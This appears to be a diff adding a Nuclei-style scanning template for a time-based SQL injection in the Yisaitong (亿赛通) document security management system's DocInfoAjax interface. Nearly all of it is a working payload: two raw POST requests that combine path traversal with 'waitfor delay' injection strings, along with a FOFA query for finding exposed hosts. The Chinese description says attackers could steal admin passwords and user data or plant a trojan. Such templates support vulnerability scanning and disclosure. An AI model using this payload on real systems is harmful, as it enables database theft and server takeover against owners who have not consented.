@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          POST /CDGServer3/js/../DocInfoAjax HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:4'--
+        - |
+          POST /CDGServer3/js/../DocInfoAjax HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:8'--
+id: yisaitong-CDG-DocInfoAjax-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/CDGServer3/index.jsp"
+        亿赛通电子文档安全管理系统DocInfoAjax接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 亿赛通电子文档安全管理系统 DocInfoAjax SQL延时注入
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/141065551
+    severity: high
+    tags: []
